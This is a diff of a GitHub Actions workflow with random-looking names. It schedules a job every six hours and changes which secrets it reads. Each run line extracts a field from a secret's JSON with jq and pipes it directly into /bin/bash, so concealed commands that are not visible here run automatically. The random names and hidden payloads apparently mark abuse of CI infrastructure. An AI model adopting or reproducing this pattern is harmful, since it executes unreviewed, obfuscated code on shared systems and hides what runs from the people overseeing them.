@@ -3,27 +3,19 @@ name: fabricatordispirited
 on:
   workflow_dispatch:
   schedule:
-    - cron: '48 4/6 * * *'
+    - cron: '27 0/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: fabricatordispirited
         env:
-          akds117: ${{ secrets.akds117 }}
+          ug30: ${{ secrets.ug30 }}
         run: |
-          echo $akds117 | jq -r .rpvlu238 | /bin/bash
-          echo $klai6 | jq -r .ekuv74 | /bin/bash
-          echo $dqkf563 | jq -r .pqve59786 | /bin/bash
-          echo $bgdia8 | jq -r .i39 | /bin/bash
-          echo $mjmy23 | jq -r .ot3177 | /bin/bash
-          echo $se41274 | jq -r .z7 | /bin/bash
-          echo $vwoc651 | jq -r .tjfw9 | /bin/bash
-          echo $dkzvk2 | jq -r .srde66 | /bin/bash
-          echo $irqp9557 | jq -r .qyn8708 | /bin/bash
-          echo $bzp6677 | jq -r .bkfmy684 | /bin/bash
-          echo $l29 | jq -r .cpyak9465 | /bin/bash
-          echo $fmmin29 | jq -r .ltjfg4 | /bin/bash
+          echo $ug30 | jq -r .alqb53 | /bin/bash
+          echo $zfdti322 | jq -r .r0927 | /bin/bash
+          echo $b5356 | jq -r .kg0 | /bin/bash
 
